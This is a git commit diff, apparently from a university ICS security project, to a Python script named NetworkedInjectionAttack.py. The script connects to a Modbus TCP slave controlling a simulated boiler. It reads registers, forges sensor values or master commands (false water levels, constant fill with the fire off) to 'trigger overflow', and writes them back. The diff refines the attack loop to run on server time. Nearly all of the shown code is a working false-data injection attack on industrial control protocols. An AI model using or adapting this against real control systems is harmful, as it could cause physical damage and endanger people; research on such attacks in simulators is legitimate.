c7543ad549bf48224f6e7abe46a6662953cda647
Jamie Sian <js17g15@soton.ac.uk>
2018-03-31 14:11:14 +0100

    to ops

--- NetworkedInjectionAttack.py
+++ NetworkedInjectionAttack.py
@@ -8,6 +8,7 @@ client = ModbusTcpClient(MODBUS_SLAVE)
 
 def readRegisters():
     # Read values from slave
+    client = ModbusTcpClient(MODBUS_SLAVE)
     result = client.read_holding_registers(0, 21, unit=1)
     addWater = ne.modbusDecode(0, 2, 2, result.registers)
     addFire = ne.modbusDecode(2, 2, 0, result.registers)
@@ -16,12 +17,11 @@ def readRegisters():
     powerOut = ne.modbusDecode(9, 6, 2, result.registers)
     steamStep = ne.modbusDecode(13, 2, 4, result.registers)
     powerIn = ne.modbusDecode(16, 6, 2, result.registers)
+    serverSeconds = ne.modbusDecode(20, 2, 0, result.registers)
 
-    return addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn
+    return addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds
 
 response = ''
-
-
 print("Sensors online, enter injection attack type:")
 print("[r]esponse - Fake slave values to trigger overflow")
 print("[c]ommand  - Fake master values to trigger overflow")
@@ -49,8 +49,9 @@ if response == 'r':
     if response == 'q':
         exit(0)
     response = int(response)
-    while packetCount < packetSend:
-        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn = readRegisters()
+
+    while serverSeconds < 7200:
+        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
         if response == 1:
             # 2,000L below optimal level
             waterLevel = 500000 - 2000
@@ -67,7 +68,6 @@ if response == 'r':
             steamStep += random.randint(275, 300)
 
         outputs = []
-
         outputs = ne.modbusEncode(waterLevel, 4, 4, outputs)
         outputs = ne.modbusEncode(waterTemp, 2, 2, outputs)
         outputs = ne.modbusEncode(powerOut, 6, 2, outputs)
@@ -77,6 +77,7 @@ if response == 'r':
         write = client.write_registers(3, outputs, unit=1)
         print(packetCount)
         packetCount += 1
+        client.close()
 
 if response == 'c':
     print("Enter stealth level:")
@@ -94,12 +95,11 @@ if response == 'c':
 
     response = int(response)
     while packetCount < packetSend:
-        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn = readRegisters()
+        addWater, addFire, waterLevel, waterTemp, powerOut, steamStep, powerIn, serverSeconds = readRegisters()
         if response == 1:
             # 1,500L constant fill, no fire
             addWater = 1500
             addFire = 0
-            print("broken")
         if response == 2:
             # 1,500L constant fill, current fire state
             addWater = 1500
@@ -119,6 +119,8 @@ if response == 'c':
         write = client.write_registers(0, outputs, unit=1)
         packetCount += 1
         print(packetCount)
+        client.close()
+    exit(0)
 
 client.close()
 
